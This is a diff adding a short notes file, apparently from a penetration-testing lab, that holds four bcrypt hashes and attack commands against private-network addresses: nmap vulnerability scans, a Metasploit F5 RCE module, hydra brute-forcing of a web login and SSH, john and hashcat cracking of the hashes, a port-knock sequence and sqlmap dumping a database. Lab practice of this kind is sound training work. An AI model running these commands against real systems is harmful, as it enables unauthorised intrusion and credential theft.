@@ -1,0 +1,33 @@
+hash bcrypt
+$2y$10$Dy2MtfKLFvH78.bLGp6a7uBdSE1WNCSbnT0HvAQLyT2iGZWGO7TMK
+$2y$10$lNS1EUevEtLqsp.OEq4UkuGREzvkouhZCdpT9h5t.Fw6oBZsai.Ei
+$2y$10$gdY5a.GIC6ulg7ybIBMh0OU7Cdo.pEebWsL7E/CLGFHoTG39LePAK
+$2y$10$3ESgP8ETH4VPpbsw4C5hze6bP6QEDMByxelQEPUdh7Uh6Q6aHRZDy
+
+
+nmap -A -p- 192.168.1.252
+nmap -p 8080 --script http-enum 192.168.1.147
+nmap -p 21 --script vuln 192.168.1.252
+
+no sense
+auxiliary(scanner/http/iis_internal_ip) 
+exploit(linux/http/f5_icontrol_soap_csrf_rce_cve_2022_41622)
+hydra -L /usr/share/seclists/Passwords/darkweb2017-top10000.txt -P /usr/share/seclists/Passwords/darkweb2017-top10000.txt http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid login"
+
+nmap -sS -A -p 2222 192.168.1.252
+
+nikto -h http://192.168.1.252
+
+john --format=bcrypt hashPass.txt
+
+hydra -L /home/kali/Desktop/BW2/users.txt -P /usr/share/seclists/Passwords/darkweb2017-top10000.txt ssh://192.168.1.252:22 -t64 -f -V
+
+hashcat -m 3200 -a 0 -w 3 -o cracked.txt hashblackbox.txt rockmini.txt
+
+knock 192.168.1.252 9220 1700 9991 55677 37789 7282
+
+sqlmap -u "http://192.168.1.15/oldsite/login.php" --data="username=admin&password=admin" --dump
+
+hashcat -m 3200 -a 0 /home/kali/Desktop/BW2/hashPass.txt /usr/share/seclists/Passwords/darkweb2017-top10000.txt
+darkweb2017-top10000.txt NO
+2023-200_most_used_passwords.txt NO
